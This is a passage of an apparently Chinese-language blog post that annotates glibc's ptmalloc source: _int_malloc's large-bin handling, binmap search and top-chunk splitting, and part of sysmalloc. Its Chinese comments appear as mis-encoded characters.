                        // å®ŒæˆåŒé“¾è¡¨çš„è¿æ¥
                        fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;
                    } else {
                        assert(chunk_main_arena (fwd));

                        // æ ¹æ® fd_nextsize è¿›è¡Œéå†ï¼Œç›´åˆ°æ‰¾åˆ°åº”è¯¥æ’å…¥çš„ä½ç½®
                        while ((unsigned long) size &lt; chunksize_nomask (fwd)) {
                            fwd = fwd-&gt;fd_nextsize;
                            assert(chunk_main_arena (fwd));
                        }
                        //  å¦‚æœä» large bin é“¾è¡¨ä¸­æ‰¾åˆ°äº†ä¸å½“å‰ chunk å¤§å°ç›¸åŒçš„ chunk
                        //
                        if ((unsigned long) size
                            == (unsigned long) chunksize_nomask (fwd))
                            /* Always insert in the second position.  */
                            fwd = fwd-&gt;fd;
                        // å¦‚æœä» large bin é“¾è¡¨ä¸­æ²¡æœ‰æ‰¾åˆ°ä¸å½“å‰ chunk å¤§å°ç›¸åŒçš„ chunk
                        else {
                            // å°† victim æ’å…¥å…¶ä¸­å¹¶å¸¦æœ‰ size åŸŸ
                            victim-&gt;fd_nextsize = fwd;
                            victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;
                            fwd-&gt;bk_nextsize = victim;
                            victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;
                        }
                        // æ¥å…¥åŒé“¾è¡¨ä¸­
                        bck = fwd-&gt;bk;
                    }
                }
                // ç›¸åº”çš„ large bin æ²¡æœ‰å€¼
                else
                    // ç›´æ¥æ’å…¥
                    victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;
            }
            // #define mark_bin(m, i)    ((m)-&gt;binmap[idx2block (i)] |= idx2bit (i))

            mark_bin (av, victim_index);
            // å°† victim ç§»åŠ¨è‡³ fd ä¸ bk çš„åŒé“¾è¡¨ä¸­
            victim-&gt;bk = bck;
            victim-&gt;fd = fwd;
            fwd-&gt;bk = victim;
            bck-&gt;fd = victim;

#if USE_TCACHE
            /* If we&#39;ve processed as many chunks as we&#39;re allowed while
           filling the cache, return one of the cached ones.  */
            ++tcache_unsorted_count;
            // æ»¡è¶³æ¡ä»¶
            if (return_cached
            &amp;&amp; mp_.tcache_unsorted_limit &gt; 0
            &amp;&amp; tcache_unsorted_count &gt; mp_.tcache_unsorted_limit)
          {
            // è¿”å›ä¹‹å‰å­˜å…¥çš„ tcache
            return tcache_get (tc_idx);
          }
#endif

#define MAX_ITERS       10000
            if (++iters &gt;= MAX_ITERS)
                break;
        }

#if USE_TCACHE
        /* If all the small chunks we found ended up cached, return one now.  */
        // å¦‚æœä¸Šé¢æ²¡æœ‰å–å‡º
        if (return_cached)
      {
        // è¿”å›ä¹‹å‰å­˜å…¥çš„ tcache
        return tcache_get (tc_idx);
      }
#endif

        /*
           If a large request, scan through the chunks of current bin in
           sorted order to find smallest that fits.  Use the skip list for this.
         */
        // åœ¨ large bin ä¸­æŸ¥æ‰¾
        if (!in_smallbin_range (nb)) {
            // åœ¨ arena æ‰¾åˆ°å¯¹åº”çš„ä½ç½®
            bin = bin_at (av, idx);

            /* skip scan if empty or largest chunk is too small */
            // bin ä¸­æœ‰å€¼
            // ä¸”è¯¥ chunk çš„ size å¤§äº nb
            if ((victim = first (bin)) != bin
                &amp;&amp; (unsigned long) chunksize_nomask (victim)
                   &gt;= (unsigned long) (nb)) {
                // ä»æœ€å°çš„é‚£ä¸ª chunk å¼€å§‹
                victim = victim-&gt;bk_nextsize;
                // ä»å°åˆ°å¤§éå†ï¼Œç›´åˆ°æ‰¾åˆ°ä¸€ä¸ª size æ¯”è¯·æ±‚çš„ nb å¤§äºæˆ–ç­‰äºçš„
                while (((unsigned long) (size = chunksize (victim)) &lt;
                        (unsigned long) (nb)))
                    victim = victim-&gt;bk_nextsize;

                /* Avoid removing the first entry for a size so that the skip
                   list does not have to be rerouted.  */
                // å¦‚æœ victim ä¸æ˜¯ bin çš„æœ€åä¸€ä¸ª chunk
                // ä¸” victim ä¸æ˜¯ skip list
                if (victim != last (bin)
                    &amp;&amp; chunksize_nomask (victim)
                       == chunksize_nomask (victim-&gt;fd))
                    // æ‹¿åˆ°çš„ victim æ˜¯ æ²¡æœ‰ next_size åŸŸçš„é‚£ä¸ª
                    victim = victim-&gt;fd;

                // åˆ‡å‰²å‰å‡†å¤‡
                remainder_size = size - nb;
                // å–æ¶ˆé“¾æ¥
                unlink (av, victim, bck, fwd);

                /* Exhaust */
                // å¦‚æœåˆ‡å‰²åçš„å¤§å°ä¸è¶³ä»¥ä½œä¸ºä¸€ä¸ª chunk ï¼Œé‚£ä¹ˆå°±ä¸åˆ†å‰²ç›´æ¥å°†å…¶æ ‡å¿—ä½è®¾ä¸º inuse
                if (remainder_size &lt; MINSIZE)
                {
                    // è®¾ç½®ä¸‹ä¸€ä¸ª chunk çš„ prev_inuse ä½
                    set_inuse_bit_at_offset (victim, size);
                    if (av != &amp;main_arena)
                        set_non_main_arena (victim);
                }
                /* Split */
                // åˆ‡å‰²
                else
                {
                    remainder = chunk_at_offset (victim, nb);
                    /* We cannot assume the unsorted list is empty and therefore
                       have to perform a complete insert here.  */
                    // å°†åˆ‡å‰²åçš„ chunk æ”¾å…¥ unsorted bin ä¸­
                    // è®°å½• remainder
                    bck = unsorted_chunks (av);
                    fwd = bck-&gt;fd;
                    if (__glibc_unlikely(fwd-&gt;bk != bck))
                        malloc_printerr(&quot;malloc(): corrupted unsorted chunks&quot;);
                    remainder-&gt;bk = bck;
                    remainder-&gt;fd = fwd;
                    bck-&gt;fd = remainder;
                    fwd-&gt;bk = remainder;
                    if (!in_smallbin_range (remainder_size)) {
                        remainder-&gt;fd_nextsize = NULL;
                        remainder-&gt;bk_nextsize = NULL;
                    }
                    set_head (victim, nb | PREV_INUSE |
                                      (av != &amp;main_arena ? NON_MAIN_ARENA : 0));
                    set_head (remainder, remainder_size | PREV_INUSE);
                    set_foot (remainder, remainder_size);
                }
                check_malloced_chunk (av, victim, nb);
                void *p = chunk2mem (victim);
                alloc_perturb(p, bytes);
                return p;
            }
        }

        /*
           Search for a chunk by scanning bins, starting with next largest
           bin. This search is strictly by best-fit; i.e., the smallest
           (with ties going to approximately the least recently used) chunk
           that fits is selected.

           The bitmap avoids needing to check that most blocks are nonempty.
           The particular case of skipping all bins during warm-up phases
           when no chunks have been returned yet is faster than it might look.
         */
        // å¦‚æœé€šè¿‡ä¸Šé¢çš„æ–¹å¼ä»æœ€åˆé€‚çš„ small bin æˆ– large bin ä¸­éƒ½æ²¡æœ‰åˆ†é…åˆ°éœ€è¦çš„ chunkï¼Œ
        // åˆ™ æŸ¥çœ‹æ¯”å½“å‰ bin çš„ index å¤§çš„ small bin æˆ– large bin æ˜¯å¦æœ‰ç©ºé—² chunk å¯åˆ©ç”¨æ¥åˆ†é…æ‰€éœ€çš„ chunkã€‚
        // è·å–ä¸‹ä¸€ä¸ªç›¸é‚» bin çš„ç©ºé—² chunk é“¾è¡¨
        ++idx;
        bin = bin_at (av, idx);
        // binmap å­—æ®µæ˜¯ä¸€ä¸ª int æ•°ç»„ï¼Œptmalloc ç”¨ä¸€ä¸ª bit æ¥æ ‡è¯†è¯¥ bit å¯¹åº”çš„ bin ä¸­æ˜¯å¦åŒ…å«ç©ºé—² chunkã€‚
        // Binmap æŒ‰ block ç®¡ç†ï¼Œæ¯ä¸ª block ä¸ºä¸€ä¸ª intï¼Œå…± 32 ä¸ª bitï¼Œå¯ä»¥è¡¨ç¤º 32 ä¸ª bin ä¸­æ˜¯å¦æœ‰ç©ºé—² chunk å­˜åœ¨ã€‚
        // ä½¿ç”¨ binmap å¯ä»¥åŠ å¿«æŸ¥æ‰¾ bin æ˜¯å¦åŒ…å«ç©ºé—² chunkã€‚
        // è¿™é‡ŒåªæŸ¥è¯¢æ¯”æ‰€éœ€ chunk å¤§çš„ bin ä¸­æ˜¯å¦æœ‰ç©ºé—² chunk å¯ç”¨ã€‚
        block = idx2block (idx);
        map = av-&gt;binmap[block];
        //     Idx2bit()å®å°† idx æŒ‡å®šçš„ä½è®¾ç½®ä¸º 1ï¼Œå…¶å®ƒä½æ¸…é›¶ï¼Œ
        //     map è¡¨ç¤ºä¸€ä¸ª block(unsigned int) å€¼ï¼Œå¦‚æœbit å¤§äº mapï¼Œ
        //     æ„å‘³ç€æ¯”bitå¯¹åº”çš„binçš„sizeå¤§çš„binä¸­æ— ç©ºé—²chunkï¼Œ
        //     å¦‚æœ map ä¸º 0ï¼Œè¯¥ block æ‰€å¯¹åº”çš„æ‰€æœ‰ bins ä¸­éƒ½æ²¡æœ‰ç©ºé—² chunkï¼Œ
        //     äºæ˜¯éå† binmap çš„ä¸‹ä¸€ä¸ª blockï¼Œç›´åˆ°æ‰¾åˆ°ä¸€ä¸ªä¸ä¸º 0 çš„ block
        //     æˆ–è€…éå†å®Œæ‰€æœ‰çš„ blockã€‚
        //     é€€å‡ºå¾ªç¯éå†åï¼Œè®¾ç½® bin æŒ‡å‘ block çš„ç¬¬ä¸€ä¸ª bit å¯¹åº”çš„ binï¼Œ
        //     å¹¶å°† bit ç½®ä¸º 1ï¼Œè¡¨ç¤ºè¯¥ block ä¸­ bit 1 å¯¹åº”çš„ binï¼Œ
        //     è¿™ä¸ª bin ä¸­å¦‚æœæœ‰ç©ºé—² chunkï¼Œè¯¥ chunk çš„å¤§å°ä¸€å®šæ»¡è¶³è¦æ±‚ã€‚
        bit = idx2bit (idx);

        for (;;) {
            //         å¦‚æœbit å¤§äº mapï¼Œæ„å‘³ç€æ¯”è¯¥bitå¯¹åº”çš„binçš„sizeå¤§çš„binä¸­æ— ç©ºé—²chunkï¼Œå¦‚æœ map ä¸º 0ï¼Œ
            //      è¯¥ block æ‰€å¯¹åº”çš„æ‰€æœ‰ bins ä¸­éƒ½æ²¡æœ‰ç©ºé—² chunk ã€‚æ¥ç€åœ¨ä¸‹ä¸€ä¸ªblockä¸­å¯»æ‰¾
            /* Skip rest of block if there are no more set bits in this block.  */
            if (bit &gt; map || bit == 0) {
                do {
                    if (++block &gt;= BINMAPSIZE) /* out of bins */
                        // å¦‚æœblockè¶…è¿‡äº†èŒƒå›´ï¼Œè¯´æ˜æ¯”æ‰€éœ€chunkå¤§çš„binä¸­æ²¡æœ‰chunkï¼Œç›´æ¥ä½¿ç”¨top_chunk
                        goto use_top;
                // å¦‚æœblockä¸º0,è¿™è¡¨æ˜blockä¸­çš„æ‰€æœ‰bitæ‰€å¯¹åº”çš„binæ²¡æœ‰ç©ºé—²chunk
                } while ((map = av-&gt;binmap[block]) == 0);

                bin = bin_at (av, (block &lt;&lt; BINMAPSHIFT));
                bit = 1;
            }

            /* Advance to bin with set bit. There must be one. */
            // åœ¨ä¸€ä¸ªblockéå†å¯¹åº”çš„ binï¼Œç›´åˆ°æ‰¾åˆ°ä¸€ä¸ª bit ä¸ä¸º 0 é€€å‡ºéå†ï¼Œåˆ™è¯¥ bit å¯¹äºçš„ bin ä¸­æœ‰ç©ºé—² chunk å­˜åœ¨ã€‚
            while ((bit &amp; map) == 0) {
                bin = next_bin (bin);
                bit &lt;&lt;= 1;
                assert(bit != 0);
            }

            /* Inspect the bin. It is likely to be non-empty */
            // è·å–binå°¾éƒ¨çš„chunk
            victim = last (bin);

            /*  If a false alarm (empty bin), clear the bit. */
            //         å¦‚æœ victim ä¸ bin é“¾è¡¨å¤´æŒ‡é’ˆç›¸åŒï¼Œè¡¨ç¤ºè¯¥ bin ä¸­æ²¡æœ‰ç©ºé—² chunkï¼Œbinmap ä¸­çš„ç›¸åº”ä½
            //        è®¾ç½®ä¸å‡†ç¡®ï¼Œå°† binmap çš„ç›¸åº” bit ä½æ¸…é›¶ï¼Œè·å–å½“å‰ bin ä¸‹ä¸€ä¸ª binï¼Œå°† bit ç§»åˆ°ä¸‹ä¸€ä¸ª
            //        bit ä½ï¼Œå³ä¹˜ä»¥ 2ã€‚
            if (victim == bin) {
                av-&gt;binmap[block] = map &amp;= ~bit; /* Write through */
                bin = next_bin (bin);
                bit &lt;&lt;= 1;
            } else {
                // å½“å‰ bin ä¸­çš„æœ€åä¸€ä¸ª chunk æ»¡è¶³è¦æ±‚ï¼Œè·å–è¯¥ chunk çš„å¤§å°ï¼Œè®¡ç®—åˆ‡åˆ†å‡ºæ‰€éœ€ chunk
                // åå‰©ä½™éƒ¨åˆ†çš„å¤§å°ï¼Œç„¶åå°† victim ä» bin çš„é“¾è¡¨ä¸­å–å‡ºã€‚
                /*  We know the first chunk in this bin is big enough to use. */
                size = chunksize (victim);
                assert((unsigned long) (size) &gt;= (unsigned long) (nb));

                remainder_size = size - nb;

                /* unlink */
                unlink (av, victim, bck, fwd);

                /* Exhaust */
                //         å¦‚æœå‰©ä½™éƒ¨åˆ†çš„å¤§å°å°äº MINSIZEï¼Œå°†æ•´ä¸ª chunk åˆ†é…ç»™åº”ç”¨å±‚ï¼Œè®¾ç½® victim çš„çŠ¶æ€ä¸º
                //        inuseï¼Œå¦‚æœå½“å‰åˆ†é…åŒºä¸ºéä¸»åˆ†é…åŒºï¼Œè®¾ç½® victim çš„éä¸»åˆ†é…åŒºæ ‡å¿—ä½ã€‚
                if (remainder_size &lt; MINSIZE)
                {
                    set_inuse_bit_at_offset (victim, size);
                    if (av != &amp;main_arena)
                        set_non_main_arena (victim);
                }

                /* Split */
                else
                {
                    // å¦‚æœå‰©ä½™çš„å¤§å°å¯ä»¥ä½œä¸ºä¸€ä¸ªchunk
                    // è·å¾—å‰©ä½™éƒ¨åˆ†çš„åœ°å€ï¼Œæ”¾å…¥unsorted binä¸­
                    remainder = chunk_at_offset (victim, nb);

                    /* We cannot assume the unsorted list is empty and therefore
                       have to perform a complete insert here.  */
                    bck = unsorted_chunks (av);
                    fwd = bck-&gt;fd;
                    // æ£€æŸ¥unsorted bin ä¸­çš„é“¾è¡¨å¤´éƒ¨æ˜¯å¦åˆæ³•
                    if (__glibc_unlikely(fwd-&gt;bk != bck))
                        malloc_printerr(&quot;malloc(): corrupted unsorted chunks 2&quot;);
                    remainder-&gt;bk = bck;
                    remainder-&gt;fd = fwd;
                    bck-&gt;fd = remainder;
                    fwd-&gt;bk = remainder;

                    /* advertise as last remainder */
                    if (in_smallbin_range (nb))
                        av-&gt;last_remainder = remainder;
                    if (!in_smallbin_range (remainder_size)) {
                        remainder-&gt;fd_nextsize = NULL;
                        remainder-&gt;bk_nextsize = NULL;
                    }
                    set_head (victim, nb | PREV_INUSE |
                                      (av != &amp;main_arena ? NON_MAIN_ARENA : 0));
                    set_head (remainder, remainder_size | PREV_INUSE);
                    set_foot (remainder, remainder_size);
                }
                check_malloced_chunk (av, victim, nb);
                void *p = chunk2mem (victim);
                alloc_perturb(p, bytes);
                return p;
            }
        }

        use_top:
        /*
           If large enough, split off the chunk bordering the end of memory
           (held in av-&gt;top). Note that this is in accord with the best-fit
           search rule.  In effect, av-&gt;top is treated as larger (and thus
           less well fitting) than any other available chunk since it can
           be extended to be as large as necessary (up to system
           limitations).

           We require that av-&gt;top always exists (i.e., has size &gt;=
           MINSIZE) after initialization, so if it would otherwise be
           exhausted by current request, it is replenished. (The main
           reason for ensuring it exists is that we may need MINSIZE space
           to put in fenceposts in sysmalloc.)
         */
        // å¦‚æœä»æ‰€æœ‰çš„ bins ä¸­éƒ½æ²¡æœ‰è·å¾—æ‰€éœ€çš„ chunkï¼Œå¯èƒ½çš„æƒ…å†µä¸º bins ä¸­æ²¡æœ‰ç©ºé—² chunkï¼Œ
        // æˆ–è€…æ‰€éœ€çš„ chunk å¤§å°å¾ˆå¤§ï¼Œä¸‹ä¸€æ­¥å°†å°è¯•ä» top chunk ä¸­åˆ†é…æ‰€éœ€ chunkã€‚
        victim = av-&gt;top;
        size = chunksize (victim);

        // æœ top chunk æ»¡è¶³æˆ‘ä»¬è¦ç”³è¯·çš„ chunk å¤§å°è¦æ±‚
        if ((unsigned long) (size) &gt;= (unsigned long) (nb + MINSIZE))
        {
            // åˆ‡å‰² top chunk
            remainder_size = size - nb;
            remainder = chunk_at_offset (victim, nb);
            av-&gt;top = remainder;
            set_head (victim, nb | PREV_INUSE |
                              (av != &amp;main_arena ? NON_MAIN_ARENA : 0));
            set_head (remainder, remainder_size | PREV_INUSE);

            check_malloced_chunk (av, victim, nb);
            void *p = chunk2mem (victim);
            alloc_perturb(p, bytes);
            return p;
        }

        /* When we are using atomic ops to free fast chunks we can get
           here for all block sizes.  */
        // å¦‚æœ top chunk ç©ºé—´ä¸å¤Ÿ
        // ä¸” fastbin ä¸­æœ‰ç©ºé—² chunk
        else if (atomic_load_relaxed(&amp;av-&gt;have_fastchunks)) {
            // è§¦å‘ malloc_consolidate å‡½æ•°åˆå¹¶ fastbin çš„ chunk
            malloc_consolidate(av);
            /* restore original bin index */
            if (in_smallbin_range (nb))
                idx = smallbin_index (nb);
            else
                idx = largebin_index (nb);
        }

            /*
               Otherwise, relay to handle system-dependent cases
             */
        else {
            void *p = sysmalloc(nb, av);
            if (p != NULL)
                alloc_perturb(p, bytes);
            return p;
        }
    }
}
</code></pre>
<h3 id="sysmalloc"><a href="#sysmalloc" class="headerlink" title="sysmalloc"></a>sysmalloc</h3><blockquote>
<p>æ­¤éƒ¨åˆ†æ¥è‡ª <a href="https://www.cnblogs.com/luoleqi/p/15520621.html#malloc_consolidatemstate-av">link</a></p>
</blockquote>
<pre><code class="c">/*
   sysmalloc handles malloc cases requiring more memory from the system.
   On entry, it is assumed that av-&gt;top does not have enough
   space to service request for nb bytes, thus requiring that av-&gt;top
   be extended or replaced.
 */
static void *sysmalloc(INTERNAL_SIZE_T nb, mstate av) {
    mchunkptr old_top;              /* incoming value of av-&gt;top */
    INTERNAL_SIZE_T old_size;       /* its size */
    char *old_end;                  /* its end address */

    long size;                      /* arg to first MORECORE or mmap call */
    char *brk;                      /* return value from MORECORE */

    long correction;                /* arg to 2nd MORECORE call */
    char *snd_brk;                  /* 2nd return val */

    INTERNAL_SIZE_T front_misalign; /* unusable bytes at front of new space */
    INTERNAL_SIZE_T end_misalign;   /* partial page left at end of new space */
    char *aligned_brk;              /* aligned offset into brk */

    mchunkptr p;                    /* the allocated/returned chunk */
    mchunkptr remainder;            /* remainder from allocation */
    unsigned long remainder_size;   /* its size */


    size_t pagesize = GLRO(dl_pagesize);
    bool tried_mmap = false;


    /*
       If have mmap, and the request size meets the mmap threshold, and
       the system supports mmap, and there are few enough currently
       allocated mmapped regions, try to directly map this request
       rather than expanding top.
     */
    // å¦‚æœæ²¡æœ‰åˆ†é…åŒº
    // æˆ–æ‰€éœ€åˆ†é…çš„ chunk å¤§å°å¤§äº mmap åˆ†é…é˜ˆå€¼ ä¸” å½“å‰è¿›ç¨‹ä½¿ç”¨ mmap() åˆ†é…çš„å†…å­˜å—å°äºè®¾å®šçš„æœ€å¤§å€¼
    if (av == NULL
        || ((unsigned long) (nb) &gt;= (unsigned long) (mp_.mmap_threshold)
            &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max))) {
        char *mm;           /* return value from mmap call*/

        try_mmap:
        /*
           Round up size to nearest page.  For mmapped chunks, the overhead
           is one SIZE_SZ unit larger than for normal chunks, because there
           is no following chunk whose prev_size field could be used.

           See the front_misalign handling below, for glibc there is no
           need for further alignments unless we have have high alignment.
         */
        // è®¡ç®—æ»¡è¶³é¡µå¯¹é½çš„æœ€å°åˆ†é…å†…å­˜å¤§å°
        if (MALLOC_ALIGNMENT == 2 * SIZE_SZ)
            size = ALIGN_UP(nb + SIZE_SZ, pagesize);
        else
            size = ALIGN_UP(nb + SIZE_SZ + MALLOC_ALIGN_MASK, pagesize);
        tried_mmap = true;

        /* Don&#39;t try if size wraps around 0 */
        // å¦‚æœé‡æ–°è®¡ç®—æ‰€éœ€åˆ†é…çš„ size å¤§äº nb
        if ((unsigned long) (size) &gt; (unsigned long) (nb)) {
            mm = (char *) (MMAP (0, size, PROT_READ | PROT_WRITE, 0));
            // å¦‚æœ mmap()åˆ†é…å†…å­˜æˆåŠŸ
            // å°† mmap()è¿”å›çš„å†…å­˜æŒ‡é’ˆå¼ºåˆ¶è½¬æ¢ä¸º chunk æŒ‡é’ˆ
            // å¹¶è®¾ç½®è¯¥ chunk çš„å¤§å°ä¸º sizeï¼ŒåŒæ—¶è®¾ç½®è¯¥ chunk çš„ IS_MMAPPED æ ‡å¿—ä½
            // è¡¨ç¤ºæœ¬ chunk æ˜¯é€šè¿‡ mmap()å‡½æ•°ç›´æ¥ä»ç³»ç»Ÿåˆ†é…çš„
            if (mm != MAP_FAILED) {
                /*
                   The offset to the start of the mmapped region is stored
                   in the prev_size field of the chunk. This allows us to adjust
                   returned start address to meet alignment requirements here
                   and in memalign(), and still be able to compute proper
                   address argument for later munmap in free() and realloc().
                 */
                // å¦‚æœ MALLOC_ALIGNMENT ä¸ç­‰äº 2 * SIZE_SZï¼Œåˆ™åˆ†é…çš„å†…å­˜
                // å¯èƒ½æ˜¯ä¸å¯¹é½çš„ï¼ŒæŒ‰ç…§ MALLOC_ALIGNMENT å…·ä½“çš„å€¼è¿›è¡Œå¯¹é½
                if (MALLOC_ALIGNMENT == 2 * SIZE_SZ) {
                    /* For glibc, chunk2mem increases the address by 2*SIZE_SZ and
                       MALLOC_ALIGN_MASK is 2*SIZE_SZ-1.  Each mmap&#39;ed area is page
                       aligned and therefore definitely MALLOC_ALIGN_MASK-aligned.  */
                    // æ£€æµ‹æ˜¯å¦å¯¹é½
                    assert(((INTERNAL_SIZE_T)chunk2mem (mm) &amp; MALLOC_ALIGN_MASK) == 0);
                    front_misalign = 0;
                } else
                    front_misalign = (INTERNAL_SIZE_T)chunk2mem (mm) &amp; MALLOC_ALIGN_MASK;
                if (front_misalign &gt; 0) {
                    correction = MALLOC_ALIGNMENT - front_misalign;
                    p = (mchunkptr) (mm + correction);
                    set_prev_size (p, correction);
                    set_head (p, (size - correction) | IS_MMAPPED);
                } else {
                    p = (mchunkptr) mm;
                    set_prev_size (p, 0);
                    set_head (p, size | IS_MMAPPED);
                }

                /* update statistics */
                // æ›´æ–°ç›¸å…³ç»Ÿè®¡å€¼ï¼Œé¦–å…ˆå°†å½“å‰è¿›ç¨‹ mmap åˆ†é…å†…å­˜å—çš„è®¡æ•°åŠ ä¸€ï¼Œå¦‚æœä½¿ç”¨
                // mmap() åˆ†é…çš„å†…å­˜å—æ•°é‡å¤§äºè®¾ç½®çš„æœ€å¤§å€¼ï¼Œå°†æœ€å¤§å€¼è®¾ç½®ä¸ºæœ€æ–°å€¼ï¼Œè¿™ä¸ª
                // åˆ¤æ–­ä¸ä¼šæˆåŠŸï¼Œå› ä¸ºä½¿ç”¨mmapåˆ†é…å†…å­˜çš„æ¡ä»¶ä¸­åŒ…æ‹¬äº†mp_.n_mmaps &lt; mp_.n_mmaps_maxï¼Œ
                // æ‰€ä»¥++mp_.n_mmaps &gt; mp_.max_n_mmaps ä¸ä¼šæˆç«‹ã€‚ç„¶åæ›´æ–° mmap åˆ†é…çš„å†…å­˜
                // æ€»é‡ï¼Œå¦‚æœè¯¥å€¼å¤§äºè®¾ç½®çš„æœ€å¤§å€¼ï¼Œå°†å½“å‰å€¼èµ‹å€¼ç»™ mp_.max_mmapped_mem
                int new = atomic_exchange_and_add(&amp;mp_.n_mmaps, 1) + 1;
                atomic_max(&amp;mp_.max_n_mmaps, new);

                unsigned long sum;
                sum = atomic_exchange_and_add(&amp;mp_.mmapped_mem, size) + size;
                atomic_max(&amp;mp_.max_mmapped_mem, sum);

                check_chunk (av, p);
                // å°†åˆ†é…çš„ chunk çš„æŒ‡é’ˆè¿”å›ï¼Œç”¨æˆ·å­˜æ”¾æ•°æ®æ—¶å°±æ˜¯ä»è¯¥æŒ‡é’ˆæŒ‡å‘çš„å†…å­˜å¼€å§‹å­˜æ”¾
                return chunk2mem (p);
            }
        }
    }

    /* There are no usable arenas and mmap also failed.  */
    if (av == NULL)
        return 0;

    /* Record incoming configuration of top */
    // ä¿å­˜å½“å‰ top chunk çš„æŒ‡é’ˆï¼Œå¤§å°å’Œç»“æŸåœ°å€åˆ°ä¸´æ—¶å˜é‡ä¸­
    old_top = av-&gt;top;
    old_size = chunksize (old_top);
    old_end = (char *) (chunk_at_offset (old_top, old_size));

    brk = snd_brk = (char *) (MORECORE_FAILURE);

    /*
       If not the first time through, we require old_size to be
       at least MINSIZE and to have prev_inuse set.
     */
    // æ£€æŸ¥ top chunk çš„åˆæ³•æ€§ï¼Œå¦‚æœç¬¬ä¸€æ¬¡è°ƒç”¨æœ¬å‡½æ•°ï¼Œtop chunk å¯èƒ½æ²¡æœ‰åˆå§‹åŒ–ï¼Œ
    // å¯èƒ½ old_size ä¸º 0ï¼Œå¦‚æœ top chunk å·²ç»åˆå§‹åŒ–ï¼Œåˆ™ top chunk çš„å¤§å°å¿…é¡»
    // å¤§äºç­‰äº MINSIZEï¼Œå› ä¸º top chunk ä¸­åŒ…å«äº† fencepostï¼Œfencepost éœ€è¦ MINSIZE
    // å¤§å°çš„å†…å­˜ã€‚Top chunk å¿…é¡»æ ‡è¯†å‰ä¸€ä¸ª chunk å¤„äº inuse çŠ¶æ€ï¼Œè¿™æ˜¯è§„å®šï¼Œå¹¶ä¸”
    // top chunk çš„ç»“æŸåœ°å€å¿…å®šæ˜¯é¡µå¯¹é½çš„ã€‚å¦å¤– top chunk çš„é™¤å» fencepost çš„å¤§å°
    // å¿…å®šå°äºæ‰€éœ€ chunk çš„å¤§å°ï¼Œä¸ç„¶åœ¨_int_malloc()å‡½æ•°ä¸­å°±åº”è¯¥ä½¿ç”¨ top chunk è·å¾—æ‰€éœ€çš„ chunk
    assert((old_top == initial_top (av) &amp;&amp; old_size == 0) ||
    ((unsigned long) (old_size) &gt;= MINSIZE &amp;&amp;
    prev_inuse (old_top) &amp;&amp;
    ((unsigned long) old_end &amp; (pagesize - 1)) == 0));

    /* Precondition: not enough current space to satisfy nb request */
    assert((unsigned long) (old_size) &lt; (unsigned long) (nb + MINSIZE));

    // å¦‚æœå½“å‰åˆ†é…åŒºä¸ºéä¸»åˆ†é…åŒº
    if (av != &amp;main_arena) {
        heap_info *old_heap, *heap;
        size_t old_heap_size;

        /* First try to extend the current heap. */
        old_heap = heap_for_ptr (old_top);
        old_heap_size = old_heap-&gt;size;
        // æ ¹æ® top chunk çš„æŒ‡é’ˆè·å¾—å½“å‰ sub_heap çš„ heap_info å®ä¾‹ï¼Œ
        // å¦‚æœ top chunk çš„å‰©ä½™æœ‰æ•ˆç©ºé—´ä¸è¶³ä»¥åˆ†é…å‡ºæ‰€éœ€çš„ chunkï¼ˆå‰
        // é¢å·²ç»æ–­è¨€ï¼Œè¿™ä¸ªè‚¯å®šæˆç«‹ï¼‰ï¼Œå°è¯•å¢é•¿ sub_heap çš„å¯è¯»å¯å†™åŒº
        // åŸŸå¤§å°ï¼Œå¦‚æœæˆåŠŸï¼Œä¿®æ”¹è¿‡å†…å­˜åˆ†é…çš„ç»Ÿè®¡ä¿¡æ¯ï¼Œå¹¶æ›´æ–°æ–°çš„ top chunk çš„ size
        if ((long) (MINSIZE +nb - old_size) &gt; 0
                                              &amp;&amp; grow_heap(old_heap, MINSIZE +nb - old_size) == 0)
        {
            av-&gt;system_mem += old_heap-&gt;size - old_heap_size;
            set_head (old_top, (((char *) old_heap + old_heap-&gt;size) - (char *) old_top)
                               | PREV_INUSE);
        }
        // è°ƒç”¨ new_heap()å‡½æ•°åˆ›å»ºä¸€ä¸ªæ–°çš„ sub_heapï¼Œç”±äºè¿™ä¸ª sub_heap ä¸­è‡³å°‘
        // éœ€è¦å®¹ä¸‹å¤§å°ä¸º nb çš„ chunkï¼Œå¤§å°ä¸º MINSIZE çš„ fencepost å’Œå¤§å°ä¸º sizeof(*heap)
        // çš„ heap_info å®ä¾‹ï¼Œæ‰€ä»¥ä¼ å…¥ new_heap()å‡½æ•°çš„åˆ†é…å¤§å°ä¸º nb + (MINSIZE + sizeof(*heap))
        else if ((heap = new_heap(nb + (MINSIZE +sizeof(*heap)), mp_.top_pad)))
        {
            /* Use a newly allocated heap.  */
            // ä½¿æ–°åˆ›å»ºçš„ sub_heap ä¿å­˜å½“å‰çš„åˆ†é…åŒºæŒ‡é’ˆï¼Œå°†è¯¥ sub_heap åŠ å…¥å½“å‰åˆ†é…åŒºçš„
            // sub_heap é“¾è¡¨ä¸­ï¼Œæ›´æ–°å½“å‰åˆ†é…åŒºå†…å­˜åˆ†é…ç»Ÿè®¡ï¼Œå°†æ–°åˆ›å»ºçš„ sub_heap ä»…æœ‰çš„ä¸€
            // ä¸ªç©ºé—²chunk ä½œä¸ºå½“å‰åˆ†é…åŒºçš„ top chunkï¼Œå¹¶è®¾ç½® top chunk çš„çŠ¶æ€
            heap-&gt;ar_ptr = av;
            heap-&gt;prev = old_heap;
            av-&gt;system_mem += heap-&gt;size;
            /* Set up the new top.  */
            top (av) = chunk_at_offset (heap, sizeof(*heap));
            set_head (top(av), (heap-&gt;size - sizeof(*heap)) | PREV_INUSE);

            /* Setup fencepost and free the old top chunk with a multiple of
               MALLOC_ALIGNMENT in size. */
            /* The fencepost takes at least MINSIZE bytes, because it might
               become the top chunk again later.  Note that a footer is set
               up, too, although the chunk is marked in use. */
            old_size = (old_size - MINSIZE) &amp;~MALLOC_ALIGN_MASK;
            set_head (chunk_at_offset(old_top, old_size + 2 * SIZE_SZ), 0 | PREV_INUSE);
            // è®¾ç½®åŸ top chunk çš„ fencepostï¼Œfencepost éœ€è¦ MINSIZE å¤§å°çš„å†…å­˜ç©ºé—´ï¼Œå°†è¯¥ old_size
